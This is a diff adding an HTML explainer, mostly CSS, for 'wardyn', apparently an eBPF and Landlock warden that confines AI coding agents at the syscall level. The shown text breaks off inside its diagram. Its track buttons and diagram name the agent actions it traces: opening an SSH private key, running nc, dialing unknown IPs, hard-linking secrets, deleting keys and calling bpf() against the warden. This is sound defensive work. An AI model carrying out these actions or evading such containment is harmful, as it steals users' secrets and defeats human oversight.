@@ -1,0 +1,1385 @@
+<title>Inside the Syscall</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=IBM+Plex+Sans:wght@400;450;600&display=swap">
+
+<style>
+/* ─────────────────────────────────────────────────────────────────────────
+   Inside the Syscall — wardyn, one kernel step at a time.
+
+   Drawn like a logic analyser: a bus from userspace down through the kernel,
+   taps hanging off it, a pulse travelling the line. Dark is the primary world
+   (this is kernel space); the light theme is the same instrument printed out.
+   ───────────────────────────────────────────────────────────────────────── */
+
+:root {
+  --void:      #E7EBF0;
+  --user-band: #F3F6F9;
+  --kern-band: #DDE3EA;
+  --surface:   #FFFFFF;
+  --wire:      #B6C0CC;
+  --wire-hot:  #8A97A6;
+  --ink:       #17202B;
+  --ink-dim:   #5A6878;
+  --ink-faint: #8996A6;
+
+  --signal:  #B4741A;
+  --signal-2:#D89A3C;
+  --deny:    #C0272D;
+  --allow:   #17794C;
+  --observe: #2C6E9B;
+
+  --step: clamp(1.6rem, 1.1rem + 1.6vw, 2.4rem);
+  --mono: "IBM Plex Mono", ui-monospace, "SF Mono", Menlo, monospace;
+  --sans: "IBM Plex Sans", ui-sans-serif, system-ui, sans-serif;
+  --rule: 1px solid var(--wire);
+}
+
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    --void: #080B11; --user-band: #131A24; --kern-band: #0C1119; --surface: #111823;
+    --wire: #263241; --wire-hot: #3D4E63; --ink: #CBD6E3; --ink-dim: #7C8CA0; --ink-faint: #55647A;
+    --signal: #E8A33D; --signal-2: #FFC978; --deny: #F0575D; --allow: #47D18E; --observe: #5AB0E8;
+  }
+}
+:root[data-theme="dark"] {
+  --void: #080B11; --user-band: #131A24; --kern-band: #0C1119; --surface: #111823;
+  --wire: #263241; --wire-hot: #3D4E63; --ink: #CBD6E3; --ink-dim: #7C8CA0; --ink-faint: #55647A;
+  --signal: #E8A33D; --signal-2: #FFC978; --deny: #F0575D; --allow: #47D18E; --observe: #5AB0E8;
+}
+
+* { box-sizing: border-box; }
+body {
+  margin: 0; background: var(--void); color: var(--ink);
+  font-family: var(--sans); font-size: 15px; line-height: 1.55;
+  -webkit-font-smoothing: antialiased;
+}
+.wrap {
+  max-width: 1180px; margin: 0 auto;
+  padding: clamp(20px, 4vw, 52px) clamp(16px, 3vw, 32px) 72px;
+  display: flex; flex-direction: column; gap: clamp(30px, 4vw, 52px);
+}
+section { display: flex; flex-direction: column; gap: 16px; }
+code { font-family: var(--mono); }
+
+/* ── masthead & section heads ───────────────────────────────────────────── */
+.masthead { display: flex; flex-direction: column; gap: 14px; }
+.eyebrow {
+  font-family: var(--mono); font-size: 11px; font-weight: 600; letter-spacing: 0.18em;
+  text-transform: uppercase; color: var(--ink-faint);
+  display: flex; align-items: center; gap: 10px; flex-wrap: wrap;
+}
+.eyebrow::after { content: ""; flex: 1; min-width: 24px; height: 1px; background: var(--wire); }
+.eyebrow .n { color: var(--signal); }
+h1 {
+  font-family: var(--mono); font-size: var(--step); font-weight: 700;
+  letter-spacing: -0.025em; line-height: 1.08; margin: 0; text-wrap: balance;
+}
+h1 .hl { color: var(--signal); }
+h2 {
+  font-family: var(--mono); font-size: clamp(1.15rem, 0.9rem + 0.9vw, 1.5rem); font-weight: 700;
+  letter-spacing: -0.02em; margin: 0; line-height: 1.15; text-wrap: balance;
+}
+.thesis, .lede { margin: 0; max-width: 64ch; color: var(--ink-dim); font-size: clamp(15px, 0.95rem + 0.2vw, 17px); }
+.thesis strong, .lede strong { color: var(--ink); font-weight: 600; }
+.lede code { font-size: .92em; color: var(--ink); background: color-mix(in srgb, var(--wire) 34%, transparent); padding: 1px 4px; }
+
+/* ── transport ──────────────────────────────────────────────────────────── */
+.transport {
+  display: flex; align-items: center; gap: 12px; flex-wrap: wrap;
+  padding: 12px 14px; background: var(--surface); border: var(--rule); border-left: 3px solid var(--signal);
+}
+button {
+  font-family: var(--mono); font-size: 12px; font-weight: 600; letter-spacing: 0.06em;
+  color: var(--ink); background: transparent; border: var(--rule); padding: 9px 14px; cursor: pointer;
+  transition: border-color .15s, color .15s, background .15s;
+}
+button:hover:not(:disabled) { border-color: var(--wire-hot); color: var(--signal); }
+button:disabled { opacity: .4; cursor: default; }
+button:focus-visible { outline: 2px solid var(--signal); outline-offset: 2px; }
+.play {
+  background: var(--signal); border-color: var(--signal); color: var(--void); min-width: 112px;
+  display: inline-flex; align-items: center; justify-content: center; gap: 8px;
+}
+.play:hover:not(:disabled) { background: var(--signal-2); border-color: var(--signal-2); color: var(--void); }
+.tick { font-family: var(--mono); font-size: 11px; letter-spacing: 0.1em; color: var(--ink-faint); font-variant-numeric: tabular-nums; }
+
+/* track picker: grouped */
+.tracks { display: flex; flex-direction: column; gap: 6px; }
+.tgroup { display: flex; align-items: center; gap: 0; flex-wrap: wrap; }
+.tgroup .g {
+  font-family: var(--mono); font-size: 10px; font-weight: 600; letter-spacing: 0.14em; text-transform: uppercase;
+  color: var(--ink-faint); width: 96px; flex: 0 0 96px;
+}
+.tgroup button { border-right-width: 0; font-weight: 500; }
+.tgroup button:last-child { border-right-width: 1px; }
+.tgroup button[aria-pressed="true"] { color: var(--signal); border-color: var(--wire-hot); background: color-mix(in srgb, var(--signal) 10%, transparent); font-weight: 600; }
+
+/* ── primer / userspace strips: short cards, depth behind the diagram ──── */
+.cap { font-family: var(--mono); font-size: 10px; font-weight: 600; letter-spacing: 0.16em; text-transform: uppercase; color: var(--ink-faint); display: flex; gap: 10px; align-items: center; }
+.cap::after { content: ""; flex: 1; height: 1px; background: var(--wire); }
+.cap b { color: var(--ink-dim); font-weight: 600; }
+.strip { display: grid; grid-template-columns: repeat(auto-fit, minmax(172px, 1fr)); gap: 1px; background: var(--wire); border: var(--rule); }
+.cl { background: var(--surface); padding: 12px 13px 13px; display: flex; flex-direction: column; gap: 4px; }
+.cl .k { font-family: var(--mono); font-size: 9.5px; letter-spacing: .14em; text-transform: uppercase; color: var(--ink-faint); }
+.cl .k.kern { color: var(--observe); } .cl .k.ours { color: var(--signal); }
+.cl .t { font-family: var(--mono); font-size: 12.5px; font-weight: 600; color: var(--ink); line-height: 1.25; }
+.cl .s { font-size: 12px; color: var(--ink-dim); line-height: 1.45; }
+.cl .s code { font-family: var(--mono); font-size: .92em; color: var(--ink); }
+/* the diagram is the table of contents: every box opens its anatomy */
+#s1 .node { cursor: pointer; }
+#s1 .node:hover rect, #s1 .node:hover circle { stroke: var(--wire-hot); }
+#s1 .node:focus { outline: none; }
+#s1 .node:focus-visible rect, #s1 .node:focus-visible circle { stroke: var(--signal); stroke-width: 2; }
+.hint { font-family: var(--mono); font-size: 11px; color: var(--ink-faint); letter-spacing: .04em; padding: 8px 14px; border-top: var(--rule); display: flex; gap: 10px; align-items: center; }
+.hint i { display: inline-block; width: 12px; height: 9px; border: 1.25px solid var(--wire-hot); border-radius: 1px; }
+.step-body a.see { font-family: var(--mono); font-size: .9em; color: var(--signal); text-decoration: none; border-bottom: 1px solid color-mix(in srgb, var(--signal) 45%, transparent); cursor: pointer; }
+.step-body a.see:hover { border-bottom-color: var(--signal); }
+.step-body p { margin: 0 0 8px; } .step-body p:last-child { margin-bottom: 0; }
+.step-body ul { margin: 6px 0 0; padding-left: 1.1em; } .step-body li { margin: 2px 0; }
+
+/* ── stage ──────────────────────────────────────────────────────────────── */
+.stage { display: grid; grid-template-columns: minmax(0, 1.55fr) minmax(280px, 1fr); gap: 18px; align-items: start; }
+@media (max-width: 880px) { .stage { grid-template-columns: 1fr; } }
+.scope { background: var(--surface); border: var(--rule); overflow: hidden; }
+.scope svg { display: block; width: 100%; height: auto; }
+
+.band-user { fill: var(--user-band); }
+.band-kern { fill: var(--kern-band); }
+.bus { stroke: var(--wire); stroke-width: 1.5; fill: none; }
+.boundary { stroke: var(--wire-hot); stroke-width: 1; stroke-dasharray: 5 4; }
+.node rect, .node circle { fill: var(--surface); stroke: var(--wire); stroke-width: 1.25; }
+.node text { font-family: var(--mono); font-size: 11px; fill: var(--ink-dim); }
+.node .n-title { font-size: 12px; font-weight: 600; fill: var(--ink); }
+.node.is-live rect, .node.is-live circle { stroke: var(--signal); stroke-width: 2; }
+.node.is-live .n-title { fill: var(--signal); }
+.node.is-deny rect, .node.is-deny circle { stroke: var(--deny); stroke-width: 2; }
+.node.is-deny .n-title { fill: var(--deny); }
+.node.is-allow rect, .node.is-allow circle { stroke: var(--allow); stroke-width: 2; }
+.node.is-allow .n-title { fill: var(--allow); }
+.node.is-obs rect { stroke: var(--observe); stroke-width: 2; }
+.node.is-obs .n-title { fill: var(--observe); }
+.node.is-alt rect { stroke-dasharray: 4 3; }
+.node.is-skip { opacity: .3; }
+.node rect, .node circle, .node text, .node { transition: opacity .3s, stroke .25s, fill .25s; }
+.lane-label { font-family: var(--mono); font-size: 10px; font-weight: 600; letter-spacing: 0.16em; fill: var(--ink-faint); }
+#pulse { transition: opacity .3s; }
+#pkt circle { fill: var(--deny); }
+#pkt.is-hidden, #pulse.is-hidden { opacity: 0; }
+/* the wire lights up behind the pulse, and stays lit */
+.bus-live { stroke: var(--signal); stroke-width: 2.4; fill: none; stroke-linecap: round; opacity: .92; }
+.bus-live.is-deny { stroke: var(--deny); }
+.bus-live.is-allow { stroke: var(--allow); }
+/* background traffic: the syscalls that never stop */
+.amb { fill: var(--ink-faint); opacity: .3; }
+/* a node the pulse has just reached */
+.node.ping rect, .node.ping circle { animation: ping .6s ease-out; }
+@keyframes ping { 0% { stroke-width: 2; } 30% { stroke-width: 4.5; } 100% { stroke-width: 2; } }
+/* the verdict's shockwave */
+.shock { fill: none; stroke: var(--deny); stroke-width: 2; opacity: 0; transform-box: fill-box; transform-origin: center; }
+.shock.allow { stroke: var(--allow); }
+.shock.go { animation: shock 1s ease-out; }
+@keyframes shock { 0% { opacity: .85; transform: scale(1); } 100% { opacity: 0; transform: scale(2.8); } }
+/* the probe rows arrive one after another */
+.map-row { opacity: 1; }
+.map-row.arm { opacity: .35; }
+.map-row.reveal { animation: reveal .3s ease-out; }
+@keyframes reveal { from { opacity: .35; transform: translateX(-4px); } to { opacity: 1; transform: none; } }
+/* § 3 · the compiled key changes */
+.compiled.swap { animation: swapin .32s ease-out; }
+@keyframes swapin { from { opacity: .35; transform: translateY(5px); } to { opacity: 1; transform: none; } }
+#pulse circle.core { fill: var(--signal); }
+#pulse circle.halo { fill: var(--signal); opacity: .16; }
+#pulse.is-deny circle { fill: var(--deny); }
+#pulse.is-allow circle { fill: var(--allow); }
+#pulse.is-hidden { opacity: 0; }
+.verdict-stamp { font-family: var(--mono); font-size: 14px; font-weight: 700; letter-spacing: 0.04em; opacity: 0; transition: opacity .3s; }
+.verdict-stamp.on { opacity: 1; }
+
+/* readout */
+.readout { display: flex; flex-direction: column; gap: 14px; }
+.panel { background: var(--surface); border: var(--rule); padding: 15px 16px; }
+.panel h3 {
+  font-family: var(--mono); font-size: 10px; font-weight: 600; letter-spacing: 0.16em;
+  text-transform: uppercase; color: var(--ink-faint); margin: 0 0 10px;
+}
+.step-no { font-family: var(--mono); font-size: 11px; font-weight: 600; color: var(--signal); letter-spacing: 0.1em; font-variant-numeric: tabular-nums; }
+.step-title { font-family: var(--mono); font-size: 15px; font-weight: 600; margin: 5px 0 8px; color: var(--ink); line-height: 1.3; }
+.step-body { margin: 0; font-size: 14px; color: var(--ink-dim); min-height: 5.6em; }
+.step-body code { font-size: .92em; color: var(--ink); background: color-mix(in srgb, var(--wire) 34%, transparent); padding: 1px 4px; }
+.maps { display: flex; flex-direction: column; gap: 3px; }
+.map-row {
+  display: grid; grid-template-columns: 1fr auto; gap: 10px; align-items: baseline;
+  font-family: var(--mono); font-size: 11.5px; padding: 5px 7px; border-left: 2px solid transparent;
+  color: var(--ink-faint); transition: color .2s, border-color .2s, background .2s;
+}
+.map-row .verdict { font-weight: 600; letter-spacing: .04em; }
+.map-row.miss { color: var(--ink-faint); }
+.map-row.hit { color: var(--ink); border-left-color: var(--deny); background: color-mix(in srgb, var(--deny) 10%, transparent); }
+.map-row.hit .verdict { color: var(--deny); }
+.map-row.pass { color: var(--ink); border-left-color: var(--allow); background: color-mix(in srgb, var(--allow) 9%, transparent); }
+.map-row.pass .verdict { color: var(--allow); }
+.feed { font-family: var(--mono); font-size: 11.5px; display: flex; flex-direction: column; gap: 2px; min-height: 96px; overflow-x: auto; }
+.feed-row {
+  display: grid; grid-template-columns: 3.6em 4.6em 1fr auto; gap: 9px; padding: 3px 0; white-space: nowrap;
+  animation: slide-in .28s ease-out; color: var(--ink-dim); font-variant-numeric: tabular-nums;
+}
+.feed-row .act { font-weight: 600; }
+.feed-row.ok .act { color: var(--allow); }
+.feed-row.block .act { color: var(--deny); }
+.feed-row.warn .act { color: var(--signal); }
+.feed-row.block .detail { color: var(--ink); }
+.feed-row .rule { color: var(--ink-faint); }
+@keyframes slide-in { from { opacity: 0; transform: translateX(-6px); } to { opacity: 1; transform: none; } }
+.feed-empty { color: var(--ink-faint); font-family: var(--mono); font-size: 11.5px; }
+.counters { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1px; background: var(--wire); border: var(--rule); }
+.counter { background: var(--surface); padding: 11px 12px; }
+.counter .k { font-family: var(--mono); font-size: 9.5px; letter-spacing: .13em; text-transform: uppercase; color: var(--ink-faint); display: block; }
+.counter .v { font-family: var(--mono); font-size: 21px; font-weight: 600; font-variant-numeric: tabular-nums; color: var(--ink); display: block; margin-top: 3px; }
+.counter.deny .v { color: var(--deny); }
+
+/* ── startup sequence: six cards on a rail ─────────────────────────────── */
+.rail { display: grid; grid-template-columns: repeat(6, 1fr); gap: 1px; background: var(--wire); border: var(--rule); border-bottom: 0; }
+@media (max-width: 900px) { .rail { grid-template-columns: repeat(3, 1fr); } }
+@media (max-width: 560px) { .rail { grid-template-columns: repeat(2, 1fr); } }
+.stg {
+  background: var(--surface); padding: 13px 14px 15px; display: flex; flex-direction: column; gap: 5px;
+  opacity: .5; transition: opacity .3s, box-shadow .3s; min-height: 118px;
+}
+.stg .lane { font-family: var(--mono); font-size: 9px; letter-spacing: .14em; text-transform: uppercase; color: var(--ink-faint); display: flex; justify-content: space-between; }
+.stg .lane.kernel { color: var(--observe); } .stg .lane.child { color: var(--allow); } .stg .lane.wardyn { color: var(--signal); }
+.stg .lane i { font-style: normal; color: var(--ink-faint); font-variant-numeric: tabular-nums; }
+.stg .t { font-family: var(--mono); font-size: 13px; font-weight: 600; color: var(--ink); line-height: 1.25; margin-top: 2px; text-wrap: balance; }
+.stg .s { font-size: 12px; color: var(--ink-dim); line-height: 1.4; }
+.stg .s code { font-family: var(--mono); font-size: .92em; color: var(--ink); }
+.stg.done { opacity: .8; }
+.stg.now { opacity: 1; box-shadow: inset 0 3px 0 var(--signal); }
+.railbar { height: 3px; background: var(--wire); border: var(--rule); border-top: 0; position: relative; overflow: hidden; }
+.railbar i { position: absolute; left: 0; top: 0; bottom: 0; width: 0; background: var(--signal); transition: width .5s cubic-bezier(.65,.02,.32,1); }
+.keyline { font-family: var(--mono); font-size: 12.5px; line-height: 1.5; color: var(--ink-dim); padding: 11px 14px; border-left: 3px solid var(--signal); background: var(--surface); min-height: 2.6em; }
+.keyline b { color: var(--ink); }
+.keyline code { font-size: .95em; color: var(--ink); }
+.fails { display: grid; grid-template-columns: repeat(auto-fit, minmax(270px, 1fr)); gap: 1px; background: var(--wire); border: var(--rule); }
+.failrow { background: var(--surface); padding: 11px 14px; display: grid; grid-template-columns: 1fr auto; gap: 6px 12px; align-items: baseline; font-size: 12.5px; }
+.failrow .w { color: var(--ink-dim); }
+.failrow .w b { color: var(--ink); font-family: var(--mono); font-size: 12px; font-weight: 600; }
+.failrow .r { font-family: var(--mono); font-size: 10.5px; font-weight: 600; letter-spacing: .08em; text-transform: uppercase; white-space: nowrap; }
+.failrow .r.open { color: var(--signal); } .failrow .r.refuse { color: var(--deny); }
+
+/* ── rule → key compiler ────────────────────────────────────────────────── */
+.compiler { display: grid; grid-template-columns: minmax(260px, 1fr) minmax(0, 1.5fr); gap: 18px; align-items: start; }
+@media (max-width: 880px) { .compiler { grid-template-columns: 1fr; } }
+.rules { display: flex; flex-direction: column; gap: 1px; background: var(--wire); border: var(--rule); }
+.rules button {
+  text-align: left; border: 0; background: var(--surface); padding: 10px 13px; font-weight: 500;
+  font-size: 12px; color: var(--ink-dim); letter-spacing: 0; display: flex; gap: 10px; align-items: baseline;
+}
+.rules button .ax { font-size: 9.5px; letter-spacing: .12em; text-transform: uppercase; color: var(--ink-faint); width: 4.2em; flex: 0 0 auto; }
+.rules button:hover { color: var(--signal); }
+.rules button[aria-pressed="true"] { color: var(--ink); background: color-mix(in srgb, var(--signal) 9%, var(--surface)); box-shadow: inset 3px 0 0 var(--signal); }
+.compiled { background: var(--surface); border: var(--rule); padding: 18px 20px; display: flex; flex-direction: column; gap: 14px; }
+.kv { display: grid; grid-template-columns: 9em 1fr; gap: 6px 14px; align-items: baseline; }
+.kv .k { font-family: var(--mono); font-size: 10px; letter-spacing: .14em; text-transform: uppercase; color: var(--ink-faint); }
+.kv .v { font-family: var(--mono); font-size: 13px; color: var(--ink); overflow-wrap: anywhere; }
+.kv .v.big { font-size: 15px; font-weight: 600; color: var(--signal); }
+.verdict-line { font-family: var(--mono); font-size: 12px; padding: 8px 10px; border-left: 3px solid var(--wire-hot); background: color-mix(in srgb, var(--wire) 26%, transparent); color: var(--ink-dim); }
+.verdict-line.exact { border-color: var(--allow); }
+.verdict-line.broad { border-color: var(--signal); }
+.verdict-line.none  { border-color: var(--deny); }
+.verdict-line b { color: var(--ink); }
+.note-p { margin: 0; font-size: 13.5px; color: var(--ink-dim); }
+.note-p code { font-size: .9em; color: var(--ink); background: color-mix(in srgb, var(--wire) 34%, transparent); padding: 0 3px; }
+
+/* ── two boundaries ─────────────────────────────────────────────────────── */
+.two { display: grid; grid-template-columns: 1fr 1fr; gap: 1px; background: var(--wire); border: var(--rule); }
+@media (max-width: 720px) { .two { grid-template-columns: 1fr; } }
+.side { background: var(--surface); padding: 18px 20px 20px; display: flex; flex-direction: column; gap: 10px; }
+.side h3 { font-family: var(--mono); font-size: 13px; font-weight: 700; margin: 0; letter-spacing: -0.01em; }
+.side h3 small { display: block; font-weight: 500; font-size: 10px; letter-spacing: .14em; text-transform: uppercase; color: var(--ink-faint); margin-bottom: 4px; }
+.side ul { margin: 0; padding-left: 1.1em; font-size: 13.5px; color: var(--ink-dim); display: flex; flex-direction: column; gap: 5px; }
+.side li b { color: var(--ink); font-weight: 600; }
+.side pre {
+  margin: 0; font-family: var(--mono); font-size: 11.5px; line-height: 1.5; padding: 10px 12px;
+  background: color-mix(in srgb, var(--wire) 26%, transparent); color: var(--ink); overflow-x: auto;
+}
+.compose { padding: 14px 18px; background: var(--surface); border: var(--rule); border-left: 3px solid var(--signal); font-size: 14px; color: var(--ink-dim); }
+.compose b { color: var(--ink); }
+
+/* ── honesty ────────────────────────────────────────────────────────────── */
+.vocab { display: grid; grid-template-columns: repeat(auto-fit, minmax(230px, 1fr)); gap: 1px; background: var(--wire); border: var(--rule); }
+.v-row { background: var(--surface); padding: 14px 16px; display: flex; flex-direction: column; gap: 4px; }
+.v-row .act { font-family: var(--mono); font-size: 15px; font-weight: 700; }
+.v-row .act.ok { color: var(--allow); } .v-row .act.warn { color: var(--signal); }
+.v-row .act.block { color: var(--deny); } .v-row .act.soft { color: var(--deny); opacity: .7; }
+.v-row .m { font-size: 13px; color: var(--ink-dim); }
+.v-row .m b { color: var(--ink); }
+.notices { display: flex; flex-direction: column; gap: 1px; background: var(--wire); border: var(--rule); }
+.notice { background: var(--surface); padding: 10px 14px; font-family: var(--mono); font-size: 11.5px; color: var(--ink-dim); line-height: 1.5; display: grid; grid-template-columns: 6.5em 1fr; gap: 12px; }
+.notice .w { color: var(--ink-faint); letter-spacing: .08em; text-transform: uppercase; font-size: 9.5px; padding-top: 3px; }
+.notice em { color: var(--signal); font-style: normal; }
+.notice.bad em { color: var(--deny); }
+
+/* ── notes, proof, limits, footer ──────────────────────────────────────── */
+.notes { display: grid; grid-template-columns: repeat(auto-fit, minmax(258px, 1fr)); gap: 1px; background: var(--wire); border: var(--rule); }
+.note { background: var(--surface); padding: 18px 18px 20px; }
+.note h3 { font-family: var(--mono); font-size: 12px; font-weight: 600; margin: 0 0 7px; color: var(--ink); letter-spacing: -0.01em; }
+.note p { margin: 0; font-size: 13.5px; color: var(--ink-dim); }
+.note code { font-family: var(--mono); font-size: .9em; color: var(--signal); }
+.proof-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(190px, 1fr)); gap: 1px; background: var(--wire); border: var(--rule); }
+.fact { background: var(--surface); padding: 15px 16px 17px; }
+.fact .num { font-family: var(--mono); font-size: 25px; font-weight: 600; font-variant-numeric: tabular-nums; letter-spacing: -0.02em; display: block; color: var(--signal); }
+.fact .lab { font-size: 12.5px; color: var(--ink-dim); display: block; margin-top: 4px; }
+table.res { border-collapse: collapse; width: 100%; font-size: 13.5px; background: var(--surface); border: var(--rule); }
+table.res th, table.res td { text-align: left; padding: 10px 14px; border-bottom: var(--rule); vertical-align: top; }
+table.res th { font-family: var(--mono); font-size: 10px; letter-spacing: .14em; text-transform: uppercase; color: var(--ink-faint); font-weight: 600; }
+table.res td.r { font-family: var(--mono); font-weight: 600; white-space: nowrap; }
+table.res td.r.g { color: var(--allow); } table.res td.r.a { color: var(--signal); }
+table.res tr:last-child td { border-bottom: 0; }
+.tablewrap { overflow-x: auto; }
+.limits { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 1px; background: var(--wire); border: var(--rule); }
+.limit { background: var(--surface); padding: 14px 16px; font-size: 13px; color: var(--ink-dim); }
+.limit b { display: block; font-family: var(--mono); font-size: 12px; color: var(--ink); margin-bottom: 4px; }
+footer { border-top: var(--rule); padding-top: 18px; font-family: var(--mono); font-size: 11.5px; color: var(--ink-faint); display: flex; justify-content: space-between; gap: 16px; flex-wrap: wrap; }
+footer a { color: var(--ink-dim); text-decoration: none; border-bottom: 1px solid var(--wire); }
+footer a:hover { color: var(--signal); border-color: var(--signal); }
+footer a:focus-visible { outline: 2px solid var(--signal); outline-offset: 2px; }
+@media (prefers-reduced-motion: reduce) { *, #pulse { transition-duration: .01ms !important; animation-duration: .01ms !important; } }
+</style>
+
+<div class="wrap">
+
+  <header class="masthead">
+    <div class="eyebrow"><span>wardyn · a kernel-level warden for AI coding agents</span></div>
+    <h1>Inside the syscall:<br>where the agent is <span class="hl">stopped</span></h1>
+    <p class="thesis">
+      An AI agent asks the kernel to open your private key. Between the ask and the answer there are
+      about four microseconds and six decisions. <strong>Wardyn lives in that gap</strong> — not as a
+      wrapper the agent could see, but as 21 eBPF programs attached to the kernel's own hooks, and a
+      second boundary drawn by Landlock. Press play and follow one syscall down. Then pick another.
+    </p>
+  </header>
+
+  <!-- ═══════════════════════════════════════════════════════════════════════
+       § 1  THE SYSCALL
+       ═══════════════════════════════════════════════════════════════════════ -->
+  <section id="s1">
+    <div class="eyebrow"><span class="n">§ 1</span><span>one call, six decisions</span></div>
+    <h2>What the kernel offers, and what wardyn makes of it</h2>
+    <p class="lede">
+      Nothing here is invented. Every mechanism below has been in mainline Linux for years; wardyn's whole
+      idea is to stand on them rather than around the agent. Read the six cards, then <strong>click any box in the
+      diagram</strong> — each one opens with what it is in the kernel and what wardyn does with it.
+    </p>
+
+    <div class="cap"><b>the kernel side</b> six mechanisms</div>
+    <div class="strip">
+      <div class="cl"><span class="k kern">syscalls</span><span class="t">The only door out of a process</span><span class="s">~450 entry points. Each takes up to six arguments and returns one integer — a descriptor, or a negative <code>errno</code>. Everything below the boundary runs at ring 0.</span></div>
+      <div class="cl"><span class="k kern">tracepoints</span><span class="t">Fixed probe points</span><span class="s"><code>sys_enter_openat</code>, <code>sched_process_fork</code>… eBPF attached here reads every argument and changes nothing. Wardyn's observers.</span></div>
+      <div class="cl"><span class="k kern">BPF-LSM</span><span class="t">Security hooks, in eBPF</span><span class="s"><code>file_open</code>, <code>bprm_check_security</code>, <code>inode_unlink</code>… return <code>-EPERM</code> and the operation stops. Needs <code>lsm=…,bpf</code>. Wardyn's deciders.</span></div>
+      <div class="cl"><span class="k kern">cgroup programs</span><span class="t">Inside connect() and sendmsg()</span><span class="s"><code>connect4/6</code>, <code>sendmsg4/6</code> run for every process in the cgroup, destination in hand, before a packet exists. Egress.</span></div>
+      <div class="cl"><span class="k kern">maps &amp; ring</span><span class="t">Kernel-side state</span><span class="s">Hash maps, LPM tries, per-CPU counters, a 256 KiB ring buffer. The verifier proves each program terminates and stays in bounds before it may load.</span></div>
+      <div class="cl"><span class="k kern">Landlock</span><span class="t">An allowlist a process applies to itself</span><span class="s">Unprivileged, inherited by every descendant, irreversible. A different LSM from BPF — wardyn's second boundary.</span></div>
+    </div>
+
+    <div class="transport">
+      <button class="play" id="play" aria-label="Play the animation">▶ Play</button>
+      <button id="step" title="Advance one step">Step</button>
+      <button id="reset">Reset</button>
+      <span class="tick" id="tick">step 0 / 8 · idle</span>
+    </div>
+
+    <div class="tracks" role="group" aria-label="Which syscall to trace">
+      <div class="tgroup"><span class="g">files</span>
+        <button data-track="deny" aria-pressed="true">read a secret</button>
+        <button data-track="allow" aria-pressed="false">read a source file</button>
+        <button data-track="hardlink" aria-pressed="false">hard-link it, read the copy</button>
+        <button data-track="delete" aria-pressed="false">rm the key</button>
+      </div>
+      <div class="tgroup"><span class="g">exec</span>
+        <button data-track="exec" aria-pressed="false">run nc</button>
+      </div>
+      <div class="tgroup"><span class="g">network</span>
+        <button data-track="net" aria-pressed="false">dial an unknown IP</button>
+        <button data-track="dns" aria-pressed="false">UDP to the resolver</button>
+        <button data-track="port" aria-pressed="false">TCP to an unlisted port</button>
+      </div>
+      <div class="tgroup"><span class="g">containment</span>
+        <button data-track="landlock" aria-pressed="false">read outside allow_paths</button>
+      </div>
+      <div class="tgroup"><span class="g">the warden</span>
+        <button data-track="bpf" aria-pressed="false">the agent calls bpf()</button>
+        <button data-track="load" aria-pressed="false">40,000 opens at once</button>
+      </div>
+    </div>
+
+    <div class="stage">
+      <div class="scope">
+        <svg viewBox="0 0 760 560" role="img" aria-labelledby="dgm-title">
+          <title id="dgm-title">A syscall crossing from userspace into the kernel, past wardyn's hooks, and back</title>
+          <defs><path id="mp" d="M0 0"></path></defs>
+          <rect class="band-user" x="0" y="0" width="760" height="168"></rect>
+          <rect class="band-kern" x="0" y="168" width="760" height="392"></rect>
+          <line class="boundary" x1="0" y1="168" x2="760" y2="168"></line>
+          <text class="lane-label" x="16" y="24">USERSPACE</text>
+          <text class="lane-label" x="16" y="190">KERNEL</text>
+          <text class="lane-label" x="744" y="163" text-anchor="end" opacity="0.75">syscall boundary</text>
+
+          <!-- the bus: every wire the pulse can travel -->
+          <path class="bus" d="M170 96 H372"></path>
+          <path class="bus" d="M372 96 V500"></path>
+          <path class="bus" d="M372 232 H520"></path>
+          <path class="bus" d="M372 316 H520"></path>
+          <path class="bus" d="M372 400 H520"></path>
+          <path class="bus" d="M372 462 H196 V110 H170"></path>
+          <path class="bus" d="M196 462 H180"></path>
+          <path class="bus" d="M108 484 V500"></path>
+          <g id="live"></g>
+          <g id="ambient"></g>
+
+          <g class="node" id="n-agent" tabindex="0" role="button">
+            <rect x="34" y="62" width="136" height="68" rx="2"></rect>
+            <text class="n-title" x="47" y="86" id="agent-name">claude</text>
+            <text x="47" y="104" id="agent-l1">uid 1000</text>
+            <text x="47" y="120" id="agent-l2">no_new_privs</text>
+          </g>
+          <g class="node" id="n-call" tabindex="0" role="button">
+            <rect x="228" y="70" width="196" height="52" rx="2"></rect>
+            <text class="n-title" x="240" y="92" id="call-name">openat()</text>
+            <text x="240" y="110" id="call-arg">~/.ssh/id_ed25519</text>
+          </g>
+          <g class="node" id="n-trace" tabindex="0" role="button">
+            <rect x="520" y="210" width="212" height="46" rx="2"></rect>
+            <text class="n-title" x="532" y="230" id="trace-name">tracepoint/sys_enter_openat</text>
+            <text x="532" y="247" id="trace-note">observes · cannot deny</text>
+          </g>
+          <g class="node" id="n-watched" tabindex="0" role="button">
+            <rect x="520" y="294" width="212" height="46" rx="2"></rect>
+            <text class="n-title" x="532" y="314" id="watched-name">WATCHED[tgid]</text>
+            <text x="532" y="331" id="watched-note">is this the agent's subtree?</text>
+          </g>
+          <g class="node" id="n-hook" tabindex="0" role="button">
+            <rect x="520" y="378" width="212" height="46" rx="2"></rect>
+            <text class="n-title" x="532" y="398" id="hook-name">lsm/file_open</text>
+            <text x="532" y="415" id="hook-note">this one can say no</text>
+          </g>
+          <g class="node" id="n-verdict" tabindex="0" role="button">
+            <circle cx="372" cy="500" r="34"></circle>
+            <text class="n-title" x="372" y="497" text-anchor="middle" id="verdict-a">—</text>
+            <text x="372" y="512" text-anchor="middle" id="verdict-b">verdict</text>
+          </g>
+          <circle id="shock" class="shock" cx="372" cy="500" r="34"></circle>
+          <g class="node" id="n-ring" tabindex="0" role="button">
+            <rect x="36" y="440" width="144" height="44" rx="2"></rect>
+            <text class="n-title" x="48" y="460" id="ring-name">EVENTS ring</text>
+            <text x="48" y="476" id="ring-note">→ feed · audit log</text>
+          </g>
+          <g class="node" id="n-receipt" tabindex="0" role="button">
+            <rect x="36" y="500" width="144" height="42" rx="2"></rect>
+            <text class="n-title" x="48" y="520" id="rcpt-name">WARDYN_DENIALS</text>
+            <text x="48" y="535" id="rcpt-note">the receipt → the agent</text>
+          </g>
+          <g id="pkt" class="is-hidden" transform="translate(108,484)"><circle r="3.2"></circle></g>
